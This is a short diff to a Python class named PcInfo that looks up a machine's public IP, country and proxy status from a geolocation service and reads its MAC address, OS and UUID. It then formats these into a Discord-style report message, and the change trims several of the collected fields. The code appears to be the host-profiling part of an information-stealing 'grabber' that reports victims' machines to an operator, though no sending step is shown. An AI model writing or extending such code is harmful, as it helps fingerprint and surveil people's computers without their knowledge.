@@ -39,24 +39,15 @@ class PcInfo:
             if r["status"] != "success":
                 raise Exception("Failed")
             country = r["country"]
-            region = r["regionName"]
-            timezone = r["timezone"]
-            reverse = r["reverse"]
-            mobile = r["mobile"]
             proxy = r["proxy"]
-            ip = r["query"]
-            mobile_emoji = lambda mobile: ":iphone:" if mobile else ":no_mobile_phones:"         
+            ip = r["query"] 
             proxy_emoji = lambda proxy: ":shield:" if proxy else ":x:"  
         except Exception:
             country = "Failed to get country"
-            region = "Failed to get region"
-            timezone = "Failed to get timezone"
-            reverse = "Failed to get reverse"
-            mobile = "Failed to get mobile"
             proxy = "Failed to get proxy"
             ip = "Failed to get IP"
                   
-        interface, addrs = next(iter(psutil.net_if_addrs().items()))
+        _, addrs = next(iter(psutil.net_if_addrs().items()))
         mac = addrs[0].address
 
         data = {
@@ -72,10 +63,6 @@ class PcInfo:
 :globe_with_meridians: **OS:** `{computer_os}`\n
 :eyes: **IP:** `{ip}`
 :flag_{self.get_country_code(country)}: **Country:** `{country}`
-:frame_photo: **Region:** `{region}`
-:clock1: **Timezone:** `{timezone}`
-:arrows_counterclockwise: **Reverse:** `{reverse}`
-{mobile_emoji(mobile)} **Mobile:** `{mobile}`
 {proxy_emoji(proxy)} **Proxy:** `{proxy}`
 :green_apple: **MAC:** `{mac}`
 :wrench: **UUID:** `{uuid}`\n
